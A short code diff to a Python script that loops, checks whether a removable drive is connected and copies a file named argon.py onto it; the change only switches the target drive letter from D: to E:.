@@ -6,9 +6,9 @@ import time
 while True:
     try:
         # Check if the target directory exists (USB drive is connected)
-        if os.path.exists("D:/"):
+        if os.path.exists("E:/"):
             # Copy the file to the target directory
-            shutil.copyfile('{}\\scr\\argon.py'.format(os.getcwd()), 'D:/argon.py')
+            shutil.copyfile('{}\\scr\\argon.py'.format(os.getcwd()), 'E:/argon.py')
             print("File copied successfully!")
             time.sleep(3)
     except Exception as e:
